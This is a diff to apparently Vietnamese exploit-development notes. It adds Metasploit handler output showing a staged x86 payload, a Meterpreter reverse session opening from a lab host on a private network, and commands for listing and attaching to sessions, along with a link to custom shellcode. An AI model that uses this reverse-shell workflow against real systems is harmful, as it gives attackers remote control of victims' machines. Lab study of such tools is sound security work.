@@ -47,6 +47,17 @@ msf exploit(handler) > set LPORT 3333
 msf exploit(handler) > set SessionCommunicationTimeout 0
 msf exploit(handler) > set ExitOnSession false
 msf exploit(handler) > exploit -j
+
+[*] Started HTTP reverse handler on http://192.168.22.105:3333
+[*] http://192.168.22.105:3333 handling request from 192.168.22.106; (UUID: cg2uneb8) Staging x86 payload (178780 bytes) ...
+[*] Meterpreter session 1 opened (192.168.22.105:3333 -> 192.168.22.106:49826) at 2025-01-23 05:17:18 -0500
+
+# Sau khi hiện các dòng trên thì liệt kê sessions và attach nếu ko thấy chữ meterpreter hiện 
+session -l
+
+sessions -i 1
+[*] Starting interaction with 1...
+
 ```
 
 Tham khảo cách viết: [Shellcode trong sách](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/shellcode_NO_CHANGE_PLEASE.py)  
